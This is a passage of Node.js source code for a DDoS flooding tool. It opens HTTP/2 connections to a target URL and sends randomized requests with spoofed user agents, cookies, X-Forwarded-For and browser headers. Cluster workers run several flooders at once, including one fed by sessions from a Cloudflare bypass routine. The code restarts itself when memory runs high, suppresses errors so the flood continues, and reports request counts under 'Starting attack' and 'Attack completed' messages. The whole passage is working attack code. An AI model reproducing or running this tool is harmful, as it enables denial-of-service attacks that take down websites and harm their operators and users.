                            "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
                            "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
                            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15",
                        ][Math.floor(Math.random() * 42)];
                        
                        // StevenStore Header Logic
                        const req = client.request({
                            ':method': 'GET',
                            ':path': (parsedTarget.path || '/') + `?vernitiger?=${crypto.randomBytes(6).toString('hex')}`,
                            ':scheme': 'https',
                            ':authority': parsedTarget.host,
                            'referer': Math.random() < 0.5 ? 'https://www.google.com/ ' : 'https://www.wikipedia.org/ ',
                            'user-agent': stevenUA,
                            'accept-language': ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-US;q=0.6,en;q=0.5', 'en;q=0.7,fr;q=0.3', 'en-US,en;q=0.5,es;q=0.3', 'en-US,en;q=0.5,de;q=0.5'][Math.floor(Math.random() * 6)],
                            'accept': '*/*',
                            'cookie': `session=${crypto.randomBytes(16).toString('hex')}; csrf_token=${crypto.randomBytes(12).toString('hex')}; path=/; Secure; HttpOnly; SameSite=Lax`,
                            'accept-encoding': ['gzip, deflate, br', 'gzip', 'br', 'identity'][Math.floor(Math.random() * 4)],
                            'cache-control': ['no-cache', 'no-store', 'max-age=0', 'max-age=3600', 'private', 'public'][Math.floor(Math.random() * 6)],
                            'pragma': Math.random() < 0.5 ? 'cache' : 'no-cache',
                            'if-modified-since': new Date(Date.now() - Math.floor(Math.random() * 1e9)).toUTCString(),
                            'if-none-match': `"${Math.random().toString(36).substring(2, 10)}"`,
                            'expires': new Date(Date.now() + Math.floor(Math.random() * 86400000)).toUTCString(),
                            'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                            'sec-ch-ua': [
                                `"Chromium";v="112", "Google Chrome";v="112", ";Not A Brand";v="99"`,
                                `"Microsoft Edge";v="112", "Chromium";v="112", ";Not A Brand";v="99"`,
                                `"Firefox";v="112", "Mozilla";v="112", ";Not A Brand";v="99"`,
                                `"Opera";v="88", "Chromium";v="112", ";Not A Brand";v="99"`,
                                `"Safari";v="16", "Apple WebKit";v="605", ";Not A Brand";v="99"`,
                                `"SamsungBrowser";v="20", "Chromium";v="112", ";Not A Brand";v="99"`
                            ][Math.floor(Math.random() * 6)],
                            'sec-ch-ua-mobile': Math.random() < 0.5 ? '?1' : '?0',
                            'sec-fetch-site': commonSecFetchSite[Math.floor(Math.random() * commonSecFetchSite.length)],
                            'sec-fetch-mode': commonSecFetchMode[Math.floor(Math.random() * commonSecFetchMode.length)],
                            'sec-fetch-user': '?1',
                            'sec-fetch-dest': 'document',
                            'upgrade-insecure-requests': '1',
                        });
                    
                        req.on('response', (headers) => {
                            if (headers[':status'] && headers[':status'] < 400) {
                                global.successRequests++;
                            } else {
                                global.blockedRequests++;
                            }
                        });
                    
                        req.on('error', () => { global.blockedRequests++; });
                        req.end();
                    } catch (e) {
                        client.destroy();
                        clearInterval(fire);
                        start();
                    }
                }
            }, 100);
        
            // Keep-alive ping loop for StevenStore
            setInterval(() => {
                if (!client.destroyed) {
                    try { client.ping(Buffer.alloc(8, 0), () => {}); } catch (e) {}
                }
            }, 1000);
        
            client.on('error', () => {
                client.destroy();
                clearInterval(fire);
                start();
            });
        
            client.on('goaway', () => {
                client.destroy();
                clearInterval(fire);
                start();
            });
        
            client.on('close', () => {
                client.destroy();
                clearInterval(fire);
                start();
            });
        
            client.on('frameError', () => {
                client.destroy();
                clearInterval(fire);
                start();
            });
        
            client.on('streamError', () => {
                client.destroy();
                clearInterval(fire);
                start();
            });
        }, () => {
             // Fail callback for createSecureConnection
             global.failedSockets++;
             setTimeout(start, 100);
        });
    }
    
    start();
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    process.stdout.write(`\r[+] Success: ${global.successRequests} | Blocked: ${global.blockedRequests} | Failed Sockets: ${global.failedSockets} | Time: ${elapsed}s / ${args.time}s`);
}

function getRandomHeapSize() {
    const min = 1000;
    const max = 5222;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// --- MASTER / WORKER LOGIC ---
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.blue + args.target.white);
    console.log(`Time: `.blue + args.time.white);
    console.log(`Rate: `.blue + args.Rate.white);
    console.log(`Thread: `.blue + args.threads.white);
    console.log(`ProxyFile: `.blue + args.proxyFile.white);
    console.log(`--------------------------------------------`.gray);

    (async () => {
        // Run bypass if requested
        if (args.cookieCount) {
            const bypassResults = await bypassCloudflareParallel(args.cookieCount);
            global.bypassData = bypassResults;
            console.log(`\n\x1b[32mSuccessfully obtained ${bypassResults.length} sessions!\x1b[0m`);
        }

        console.log("\x1b[32mStarting attack...\x1b[0m\n");
        global.startTime = Date.now();
        
        const restartScript = () => {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
            console.log('[>] Restarting script', RESTART_DELAY, 'ms...');
            setTimeout(() => {
                for (let counter = 1; counter <= args.threads; counter++) {
                    const heapSize = getRandomHeapSize();
                    const worker = cluster.fork({ 
                        NODE_OPTIONS: `--max-old-space-size=${heapSize}`,
                        WORKER_TARGET: args.target,
                        WORKER_TIME: args.time,
                        WORKER_THREADS: args.threads,
                        WORKER_PROXYFILE: args.proxyFile,
                        WORKER_RATE: args.Rate,
                        WORKER_MODE: args.mode || 'direct'
                    });
                    
                    // Send bypass data to worker
                    if (global.bypassData && global.bypassData.length > 0) {
                        worker.send({ type: 'bypassData', data: global.bypassData });
                    }
                }
            }, RESTART_DELAY);
        };

        const handleRAMUsage = () => {
            const totalRAM = os.totalmem();
            const usedRAM = totalRAM - os.freemem();
            const ramPercentage = (usedRAM / totalRAM) * 100;

            if (ramPercentage >= MAX_RAM_PERCENTAGE) {
                console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
                restartScript();
            }
        };

        setInterval(handleRAMUsage, 5000);

        // Fork initial workers
        for (let counter = 1; counter <= args.threads; counter++) {
            const heapSize = getRandomHeapSize();
            const worker = cluster.fork({ 
                NODE_OPTIONS: `--max-old-space-size=${heapSize}`,
                WORKER_TARGET: args.target,
                WORKER_TIME: args.time,
                WORKER_THREADS: args.threads,
                WORKER_PROXYFILE: args.proxyFile,
                WORKER_RATE: args.Rate,
                WORKER_MODE: args.mode || 'direct'
            });
            
            // Send bypass data to worker immediately
            if (global.bypassData && global.bypassData.length > 0) {
                worker.send({ type: 'bypassData', data: global.bypassData });
            }
        }
        
        const statsInterval = setInterval(displayStats, 1000);

        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
                global.blockedRequests += message.blocked || 0;
                global.failedSockets += message.sockets || 0;
            }
        });

        setTimeout(() => {
            clearInterval(statsInterval);
            displayStats();
            console.log("\n\x1b[32mAttack completed!\x1b[0m");
            console.log(`\x1b[36mFinal statistics:\x1b[0m`);
            console.log(`   Total requests: ${global.totalRequests}`);
            console.log(`   Success: ${global.successRequests}`);
            console.log(`   Blocked: ${global.blockedRequests}`);
            console.log(`   Failed: ${global.failedRequests}`);
            console.log(`   Failed Sockets: ${global.failedSockets}`);
            console.log(`   Sessions used: ${global.bypassData ? global.bypassData.length : 0}`);
            process.exit(0);
        }, args.time * 1000);
    })();

} else {
    // WORKER PROCESS - Get args from environment variables
    const args = {
        target: process.env.WORKER_TARGET,
        time: parseInt(process.env.WORKER_TIME),
        threads: parseInt(process.env.WORKER_THREADS),
        proxyFile: process.env.WORKER_PROXYFILE,
        Rate: parseInt(process.env.WORKER_RATE),
        mode: process.env.WORKER_MODE
    };
    
    const parsedTarget = url.parse(args.target);
    const proxies = readLines(args.proxyFile);
    const cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
    let workerBypassData = [];
    let bypassStarted = false;
    
    // Initialize stats for this worker
    global.totalRequests = 0;
    global.successRequests = 0;
    global.failedRequests = 0;
    global.blockedRequests = 0;
    global.failedSockets = 0;
    
    // START ALL ATTACK METHODS IMMEDIATELY
    
    // Attack 1: Script 1 Flooder
    const startScript1 = () => {
        setInterval(() => {
            try {
                runFlooderScript1();
            } catch(e) {}
        }, 1);
    };
    
    // Attack 2: Script 2 Flooder  
    const startScript2 = () => {
        setInterval(() => {
            try {
                runFlooderScript2();
            } catch(e) {}
        }, 1);
    };
    
    // Attack 4: StevenStore Flooder
    const startScript4 = () => {
        setInterval(() => {
            try {
                runStevenStoreAttack();
            } catch(e) {}
        }, 1);
    };
    
    // Attack 3: Cookie-based Flooder (starts when bypass data received)
    const startScript3 = () => {
        if (bypassStarted) return;
        bypassStarted = true;
        
        setInterval(() => {
            if (workerBypassData.length === 0) return;
            try {
                for (let i = 0; i < 10; i++) {
                    const bypassInfo = randomElement(workerBypassData);
                    const cookieString = bypassInfo.cookies ? bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ") : "";
                    const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
                    floodWithCookies(userAgent, cookieString);
                }
            } catch(e) {}
        }, 100);
    };
    
    // Start attacks 1, 2, and 4 immediately
    startScript1();
    startScript2();
    startScript4();
    
    // Listen for bypass data to start attack 3
    process.on('message', (msg) => {
        if (msg.type === 'bypassData' && msg.data && msg.data.length > 0) {
            workerBypassData = msg.data;
            startScript3();
        }
    });
    
    // Send stats to master every second
    setInterval(() => {
        process.send({
            type: 'stats',
            total: global.totalRequests,
            success: global.successRequests,
            failed: global.failedRequests,
            blocked: global.blockedRequests,
            sockets: global.failedSockets
        });
        // Reset local counters
        global.totalRequests = 0;
        global.successRequests = 0;
        global.failedRequests = 0;
        global.blockedRequests = 0;
        global.failedSockets = 0;
    }, 1000);

    // Exit after time expires
    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);
}

// Error handling
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']; 
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
